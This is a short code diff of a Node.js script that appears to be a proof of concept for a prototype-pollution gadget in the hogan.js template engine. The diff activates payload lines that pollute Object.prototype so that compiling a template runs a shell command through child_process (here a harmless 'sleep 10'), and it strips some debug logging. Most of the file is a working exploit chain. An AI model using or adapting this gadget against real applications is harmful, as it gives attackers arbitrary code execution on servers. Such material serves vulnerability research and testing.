@@ -3,8 +3,8 @@ const hogan = require("hogan.js");
 
 /* Polluted Payload*/
 // inject property to root prototype
-// Object.prototype.delimiters = 'tr \n';
-// Object.prototype.indent = '/*"));return process.mainModule.require(`child_process`).execSync(`sleep 10`).toString()//*/';
+Object.prototype.delimiters = 'tr \n';
+Object.prototype.indent = '/*"));return process.mainModule.require(`child_process`).execSync(`sleep 10`).toString()//*/';
 
 /* Exported Function Call*/
 const TEMPLATE = `
@@ -31,12 +31,6 @@ const TEMPLATE = `
 </table>
 `;
 
-// for node-find-undefined
-console.log("="*20+"start"+"="*20+"\n")
-
 const template = hogan.compile(TEMPLATE);
 template.render();
-
-// for node-find-undefined
-console.log("="*20+"end"+"="*20+"\n")
 
